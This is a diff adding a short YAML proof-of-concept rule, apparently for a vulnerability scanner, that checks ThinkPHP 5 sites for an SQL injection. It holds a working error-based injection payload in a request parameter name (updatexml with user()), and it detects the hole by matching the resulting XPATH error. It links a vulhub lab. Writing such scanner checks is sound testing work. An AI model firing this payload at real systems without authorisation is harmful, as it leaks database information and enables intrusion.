@@ -1,0 +1,11 @@
+name: poc-yaml-thinkphp5-in-sqlinjection
+rules:
+  - method: GET
+    path: /index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1
+    follow_redirects: false
+    expression: |
+      status==500 && body.bcontains(b'General error: 1105 XPATH syntax error:')
+detail:
+  author: hy9125(https://github.com/hy9125)
+  links:
+    - https://github.com/vulhub/vulhub/tree/master/thinkphp/in-sqlinjection
